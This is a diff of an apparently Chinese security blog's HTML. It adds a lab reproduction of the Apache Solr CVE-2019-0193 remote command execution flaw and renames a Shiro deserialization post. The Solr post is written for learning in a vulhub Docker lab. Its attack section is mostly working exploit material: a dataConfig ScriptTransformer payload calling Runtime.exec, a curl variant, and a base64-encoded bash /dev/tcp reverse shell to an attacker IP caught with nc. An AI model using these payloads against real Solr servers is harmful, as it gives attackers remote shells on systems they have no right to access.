@@ -134,6 +134,174 @@
     
     
     <article
+  id="post-二CVE-2019-0193：Apache-Solr远程命令执行漏洞复现"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2021/04/24/%E4%BA%8CCVE-2019-0193%EF%BC%9AApache-Solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
+    >二CVE-2019-0193：Apache Solr远程命令执行漏洞复现</a> 
+</h2>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2021/04/24/%E4%BA%8CCVE-2019-0193%EF%BC%9AApache-Solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-date">
+  <time datetime="2021-04-24T07:08:18.000Z" itemprop="datePublished">2021-04-24</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="0X00-漏洞概述"><a href="#0X00-漏洞概述" class="headerlink" title="0X00 漏洞概述"></a>0X00 漏洞概述</h1><p>​    2019年8月1日，Apache Solr官方发布了CVE-2019-0193漏洞预警，漏洞危害评级为严重。</p>
+<p>​    此次漏洞出现在Apache Solr的DataImportHandler，该模块是一个可选但常用的模块，用于从数据库和其他源中提取数据。它具有一个功能，其中所有的DIH配置都可以通过外部请求dataConfig参数来设置。由于DIH配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行。</p>
+<h1 id="0X01-影响版本、利用条件"><a href="#0X01-影响版本、利用条件" class="headerlink" title="0X01 影响版本、利用条件"></a>0X01 影响版本、利用条件</h1><p>Apache solr &lt; 8.2.0</p>
+<p>利用条件：</p>
+<p>​    1.Apache Solr的DataImportHandler启用了模块DataImportHandler(默认情况下该模块不会被启用)</p>
+<p>​    2.Solr Admin UI未开启鉴权认证。（默认情况下打开web界面无需任何认证）</p>
+<h1 id="0X02-环境搭建"><a href="#0X02-环境搭建" class="headerlink" title="0X02 环境搭建"></a>0X02 环境搭建</h1><ul>
+<li>使用kali2020，装有docker的虚拟机</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;archive&#x2F;master.zip -O vulhub-master.zip</span><br><span class="line"></span><br><span class="line">unzip vulhub-master.zip</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>进入进入漏洞目录使用docker-compose启动漏洞环境</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master&#x2F;solr&#x2F;CVE-2019-0193</span><br><span class="line"></span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/04/24/%E4%BA%8CCVE-2019-0193%EF%BC%9AApache-Solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%AE%89%E8%A3%85%E5%9B%BE2.png"></p>
+<ul>
+<li>在输入命令创建test核心</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose exec solr bash bin&#x2F;solr create_core -c test -d example&#x2F;example-DIH&#x2F;solr&#x2F;db</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/04/24/%E4%BA%8CCVE-2019-0193%EF%BC%9AApache-Solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%AE%89%E8%A3%85%E5%9B%BE3.png"></p>
+<ul>
+<li>浏览器访问 http://靶机ip:8983，出现以下页面安装成功</li>
+</ul>
+<p><img src="/2021/04/24/%E4%BA%8CCVE-2019-0193%EF%BC%9AApache-Solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/anz%E5%9B%BE4.png"></p>
+<h1 id="0X03-漏洞分析"><a href="#0X03-漏洞分析" class="headerlink" title="0X03 漏洞分析"></a>0X03 漏洞分析</h1><h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><h3 id="Dataimport"><a href="#Dataimport" class="headerlink" title="Dataimport"></a>Dataimport</h3><p>用于导入自定义数据，dataconfig需要满足一定语法，参考</p>
+<ul>
+<li>[<a href>https://lucene.apache.org/solr/guide/6_6/uploading-structured-data-store-data-with-the-data-import-handler.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/solr/DataImportHandler">https://cwiki.apache.org/confluence/display/solr/DataImportHandler</a></li>
+</ul>
+<p>ScriptTransformer可以编写自定义脚本，例如Javascript、JRuby、Jython、Groovy和BeanShell</p>
+<p>​    ScriptTransformer容许用脚本语言如Javascript、JRuby、Jython、Groovy和BeanShell转换，函数应当以行（类型为Map&lt;String,Object&gt;）为参数，可以修改字段。</p>
+<p>​    脚本应当写在数据仓库配置文件顶级的script元素内，而转换器属性值为script:函数名。（<strong>换言之可以自己编写脚本，不过要加上<code>&lt;script&gt; &lt;/script&gt;</code> 元素标志头</strong>）</p>
+<p>​    要写脚本必须满足以下条件：”脚本内容”写在数据库配置文件中的<code>&lt;script&gt;脚本内容&lt;/script&gt;</code>标签之内，并且每个函数都必须接受一个名为<code>row</code>的变量，该变量的数据类型为 <code>Map&lt;String,Object&gt;</code>(键名-键值 映射)，因为是Map类型的变量，所以它可以使用<code>get()</code>,<code>put()</code>,<code>remove()</code>,<code>clear()</code>等方法操作元素。</p>
+<p>​    所以通过脚本可以实现各种操作：修改已存在的字段的值、添加新字段等。每个函数的返回值都返回的是”对象”。</p>
+<p>​    该脚本将插入DIH配置文件中（脚本内容 在DIH配置文件中的第一行开始），并为每一个”行”(row)调用一次脚本，有多少”行”(row)就调用多少次脚本。</p>
+<p>例如：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;dataconfig&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 函数定义：  该脚本的作用是，获取<span class="string">&quot;华氏温度&quot;</span>（键名为temp_f）数值，计算出对应的<span class="string">&quot;摄氏温度&quot;</span>（键名为temp_c ）的值如<span class="number">99</span> ，插入键值对   <span class="string">&#x27;temp_c&#x27;</span>,<span class="number">99</span> 到这个名为row的<span class="built_in">Map</span>对象，retrun该对象  --&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 函数定义：生成一个新的row的脚本 它的作用是获取到华氏温度temp_f  根据该数值计算出 摄氏温度temp_c 并生成一个新row --&gt;</span><br><span class="line"></span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f2c</span>(<span class="params">row</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> tempf, tempc;</span><br><span class="line">      tempf = row.get(<span class="string">&#x27;temp_f&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> (tempf != <span class="literal">null</span>) &#123;</span><br><span class="line">        tempc = (tempf - <span class="number">32.0</span>)*<span class="number">5.0</span>/<span class="number">9.0</span>;</span><br><span class="line">        row.put(<span class="string">&#x27;temp_c&#x27;</span>, temp_c);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> row;</span><br><span class="line">    &#125;</span><br><span class="line">    ]]&gt;</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">  &lt;<span class="built_in">document</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 函数调用：实体entity 中的属性transformer的值 为 函数名称（字符串 f2c ）,这样从外部数据源取到一条row，就会调用一次上面脚本中定义的名为f2c函数.  有多少条数据就调用多少次脚本中的函数 --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;entity name=<span class="string">&quot;e1&quot;</span> pk=<span class="string">&quot;id&quot;</span> transformer=<span class="string">&quot;script:f2c&quot;</span> query=<span class="string">&quot;select * from X&quot;</span>&gt;</span><br><span class="line">      ....</span><br><span class="line">    &lt;/entity&gt;</span><br><span class="line">  &lt;/<span class="built_in">document</span>&gt;</span><br><span class="line">&lt;/dataConfig&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Nashorn引擎"><a href="#Nashorn引擎" class="headerlink" title="Nashorn引擎"></a>Nashorn引擎</h3><p>解析js脚本，可以通过Java.typeAPI在JavaScript中引用，就像Java的import一样（<strong>将文件包含在内</strong>）例如：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> MyJavaClass = Java.type(<span class="string">&#x27;my.package.MyJavaClass&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> result = MyJavaClass.sayHello(<span class="string">&quot;Nashorn&quot;</span>);</span><br><span class="line">print(result);</span><br></pre></td></tr></table></figure>
+
+<h2 id="详细分析在以下文章"><a href="#详细分析在以下文章" class="headerlink" title="详细分析在以下文章"></a>详细分析在以下文章</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5965">https://xz.aliyun.com/t/5965</a></li>
+</ul>
+<h1 id="0X04-PoC"><a href="#0X04-PoC" class="headerlink" title="0X04 PoC"></a>0X04 PoC</h1><ul>
+<li>进入DIH admin界面</li>
+</ul>
+<p><img src="/2021/04/24/%E4%BA%8CCVE-2019-0193%EF%BC%9AApache-Solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/DIHadmin%E7%95%8C%E9%9D%A2.png"></p>
+<p>构造PoC的注意点1：<code>debug=true</code></p>
+<p>​    如图，DataImportHandler模块的DIH admin界面中有一个debug选项(本来是为了方便对”DIH配置”进行调试或开发)，勾选<code>Debug</code>，点击Execute，看到在HtTP请求中是<code>debug=true</code>，在PoC中必须带上它（为了回显结果）</p>
+<p>构造PoC的注意点2：<strong>dataConfig信息</strong></p>
+<p>​    注意：数据配置(dataconfig)中实体(entity)、字段(field)标签中有哪些属性取决于用了哪个处理器(processor)、哪个转换器(transformer)</p>
+<p>​    dataConfig信息中的关键点（1）：这里我使用的数据源的类型是URLDataSource(理论上其他数据源的类型都可以)</p>
+<p>​    dataConfig信息中的关键点（2）：既然有（1），所以<code>&lt;document&gt;</code>中的 <code>&lt;entity&gt;</code>实体标签里说明了该实体的属性。</p>
+<ul>
+<li><code>&lt;entity&gt;</code>实体的属性<ul>
+<li>属性name 必填 用于标识实体的唯一名称</li>
+<li>属性processor可选项 默认值为<code>SqlEntityProcessor</code>，所以当数据源不是RDBMS时必须填写该项。对于<code>URLDataSource</code>类型的数据源而言，它的值必须为“XPathEntityProcessor”(根据官方说明只能使用XPathEntityProcessor对‘URL的HTTP响应“做处理)；</li>
+<li>属性transformer可选项 填写格式为<code>transformer=&quot;script:&lt;function-name&gt;&quot;</code> 指定了转换数据时具体的transformer(转换器)需要执行的脚本函数的名称(即字符串“poc“)；</li>
+<li>属性forEach 必填 值为Xpath表达式 用于“划分“记录。如果有多种类型的记录就用<code>|</code>符号把这些表达式分隔开；</li>
+<li>属性url的值用于调用REST API的URL(可以模板化)</li>
+</ul>
+</li>
+</ul>
+<p>​    dataConfig信息中的关键点（3）：<code>&lt;dataConfig&gt;</code>中的<code>&lt;script&gt;</code>标签中，写了名为”poc”的脚本函数的具体实现。</p>
+<p><strong>PoC：</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;dataConfig&gt;</span><br><span class="line">  &lt;dataSource type=<span class="string">&quot;URLDataSource&quot;</span>/&gt;</span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line">          <span class="function"><span class="keyword">function</span> <span class="title">poc</span>(<span class="params"></span>)</span>&#123; java.lang.Runtime.getRuntime().exec(<span class="string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>); <span class="comment">//弹出计算器 &lt;script&gt;脚本内容&lt;/script&gt;</span></span><br><span class="line">          &#125;</span><br><span class="line">  ]]&gt;&lt;/script&gt;  </span><br><span class="line">  &lt;<span class="built_in">document</span>&gt;</span><br><span class="line">    &lt;entity name=<span class="string">&quot;stackoverflow&quot;</span></span><br><span class="line">            url=<span class="string">&quot;https://stackoverflow.com/feeds/tag/solr&quot;</span></span><br><span class="line">            processor=<span class="string">&quot;XPathEntityProcessor&quot;</span></span><br><span class="line">            forEach=<span class="string">&quot;/feed&quot;</span></span><br><span class="line">            transformer=<span class="string">&quot;script:poc&quot;</span> /&gt;</span><br><span class="line">  &lt;/<span class="built_in">document</span>&gt;</span><br><span class="line">&lt;/dataConfig&gt;</span><br></pre></td></tr></table></figure>
+
+<p>同一类型PoC：替换<code>&lt;script&gt;&lt;/script&gt;</code>内容即可</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;&lt;![CDATA[</span><br><span class="line">          <span class="function"><span class="keyword">function</span> <span class="title">poc</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line"><span class="keyword">new</span> java.lang.ProcessBuilder[<span class="string">&quot;(java.lang.String[])&quot;</span>]([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;curl your.net/demo&quot;</span>]).start()</span><br><span class="line">&#125;</span><br><span class="line">  ]]&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="0X05-漏洞利用"><a href="#0X05-漏洞利用" class="headerlink" title="0X05 漏洞利用"></a>0X05 漏洞利用</h1><ul>
+<li>创建成功后，访问<code>http://ip:8983</code>访问Apache solr的管理页面，选择<code>test</code>核心</li>
+</ul>
+<p><img src="/2021/04/24/%E4%BA%8CCVE-2019-0193%EF%BC%9AApache-Solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%88%A9%E7%94%A81.png"></p>
+<ul>
+<li>编写EXP，反弹shell，命令进行base64编码</li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp/<span class="number">192.168</span><span class="number">.171</span><span class="number">.133</span>/<span class="number">1234</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br><span class="line">编码后</span><br><span class="line">YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3MS4xMzMvMTIzNCAwPiYx</span><br></pre></td></tr></table></figure>
+
+<p>将PoC的内容修改，为EXP</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;dataConfig&gt;</span><br><span class="line">  &lt;dataSource type=<span class="string">&quot;URLDataSource&quot;</span>/&gt;</span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line">          <span class="function"><span class="keyword">function</span> <span class="title">poc</span>(<span class="params"></span>)</span>&#123; java.lang.Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3MS4xMzMvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">  ]]&gt;&lt;/script&gt;</span><br><span class="line">  &lt;<span class="built_in">document</span>&gt;</span><br><span class="line">    &lt;entity name=<span class="string">&quot;stackoverflow&quot;</span></span><br><span class="line">            url=<span class="string">&quot;https://stackoverflow.com/feeds/tag/solr&quot;</span></span><br><span class="line">            processor=<span class="string">&quot;XPathEntityProcessor&quot;</span></span><br><span class="line">            forEach=<span class="string">&quot;/feed&quot;</span></span><br><span class="line">            transformer=<span class="string">&quot;script:poc&quot;</span> /&gt;</span><br><span class="line">  &lt;/<span class="built_in">document</span>&gt;</span><br><span class="line">&lt;/dataConfig&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>攻击机开启nc监听1234端口</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/04/24/%E4%BA%8CCVE-2019-0193%EF%BC%9AApache-Solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%9B%91%E5%90%AC.png"></p>
+<ul>
+<li>开始攻击</li>
+</ul>
+<ol>
+<li>访问Dataimport</li>
+<li>勾选Debug</li>
+<li>点击Debug Mode进入调试模式</li>
+<li>使用EXP替换配置文件内容为(反弹shell到攻击机ip:端口)</li>
+<li>执行</li>
+</ol>
+<p><img src="/2021/04/24/%E4%BA%8CCVE-2019-0193%EF%BC%9AApache-Solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%88%A9%E7%94%A82.png"></p>
+<ul>
+<li>成功反弹shell</li>
+</ul>
+<p><img src="/2021/04/24/%E4%BA%8CCVE-2019-0193%EF%BC%9AApache-Solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%BC%B9shell.png"></p>
+<h1 id="0X06-修复建议"><a href="#0X06-修复建议" class="headerlink" title="0X06 修复建议"></a>0X06 修复建议</h1><p>​    Solr&gt;=8.2.0版安全。因为从Solr&gt;=8.2.0版开始，默认不可使用dataConfig参数，想使用此参数需要将Java System属性“enable.dih.dataConfigParam”设置为true。只有当Solr&gt;=8.2.0但是主动将Java System属性“enable.dih.dataConfigParam”设置为true，才存在漏洞。</p>
+<h1 id="0X07-参考文章"><a href="#0X07-参考文章" class="headerlink" title="0X07 参考文章"></a>0X07 参考文章</h1><ul>
+<li><p>[<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5965">https://xz.aliyun.com/t/5965</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/maxvchay/article/details/107017329">https://blog.csdn.net/maxvchay/article/details/107017329</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv9964152/">https://www.bilibili.com/read/cv9964152/</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5941">https://xz.aliyun.com/t/5941</a></p>
+</li>
+</ul>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+    
+ 
+    
+</article>
+
+    
+    <article
   id="post-Java-0java-SE-大纲"
   class="article article-type-post"
   itemscope
@@ -1702,7 +1870,7 @@
 
     
     <article
-  id="post-Shiro-RememberMe-1-2-4-反序列化导致的命令执行漏洞复现"
+  id="post-一Shiro-RememberMe-1-2-4-反序列化导致的命令执行漏洞复现"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -1713,17 +1881,21 @@
     <header class="article-header">
        
 <h2 itemprop="name">
-  <a class="article-title" href="/2021/04/15/Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
-    >Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞复现</a> 
+  <a class="article-title" href="/2021/04/15/%E4%B8%80Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
+    >一Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞复现</a> 
 </h2>
  
 
     </header>
      
     <div class="article-meta">
-      <a href="/2021/04/15/Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-date">
+      <a href="/2021/04/15/%E4%B8%80Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-date">
   <time datetime="2021-04-15T05:49:15.000Z" itemprop="datePublished">2021-04-15</time>
-</a>    
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+  </div>
+   
     </div>
       
     <div class="article-entry" itemprop="articleBody">
@@ -1733,13 +1905,13 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt-get install docker</span><br><span class="line">apt-get install docker-compose</span><br><span class="line">reboot</span><br><span class="line">service docker start （每次开机需要重新启动服务）</span><br><span class="line">docker pull medicean&#x2F;vulapps:s_shiro_1 (漫长的下载)</span><br><span class="line">docker run -d -p 80:8080 medicean&#x2F;vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>
 
 <p>访问ip，出现以下页面即搭建成功：</p>
-<p><img src="/2021/04/15/Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%8E%AF%E5%A2%83%E5%9B%BE1.png"></p>
+<p><img src="/2021/04/15/%E4%B8%80Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%8E%AF%E5%A2%83%E5%9B%BE1.png"></p>
 <h1 id="0x02-漏洞验证"><a href="#0x02-漏洞验证" class="headerlink" title="0x02 漏洞验证"></a>0x02 漏洞验证</h1><p>访问ip，点击<code>Log in</code>，进行登录</p>
-<p><img src="/2021/04/15/Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A21.png"></p>
+<p><img src="/2021/04/15/%E4%B8%80Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A21.png"></p>
 <p>Username 和 Password 随意输入，但<strong>一定要勾选</strong><code>Remember Me</code>，点击Login 进行抓包</p>
-<p><img src="/2021/04/15/Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A22.png"></p>
+<p><img src="/2021/04/15/%E4%B8%80Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A22.png"></p>
 <p>数据包发送至<code>Repeater模块</code>再次发送，出现<code>deleteMe</code>则漏洞存在</p>
-<p><img src="/2021/04/15/Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E.png"></p>
+<p><img src="/2021/04/15/%E4%B8%80Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E.png"></p>
 <h1 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h1><p>​    从官方文档中，知道在Shiro配置类中加入rememberMe管理器代码中写到cookie加密密钥默认为<strong>AES算法</strong>  </p>
 <p>​    Apache Shiro默认使用了<code>CookieRememberMeManager</code>，其处理cookie的流程是：得到<code>rememberMe的cookie值</code> &gt;  <code>Base64解码</code>–&gt;<code>AES解密</code>–&gt;<code>反序列化</code> AES的密钥是硬编码，密钥存储在源码中，分析源码就可获得密钥</p>
 <p>从官方的 issue 上来看，存在几个重要的点:</p>
@@ -1752,15 +1924,15 @@
 <li>Java serialization</li>
 </ul>
 <p>输入正确账户，获取cookie值</p>
-<p><img src="/2021/04/15/Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E8%8E%B7%E5%8F%96cookie.png"></p>
+<p><img src="/2021/04/15/%E4%B8%80Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E8%8E%B7%E5%8F%96cookie.png"></p>
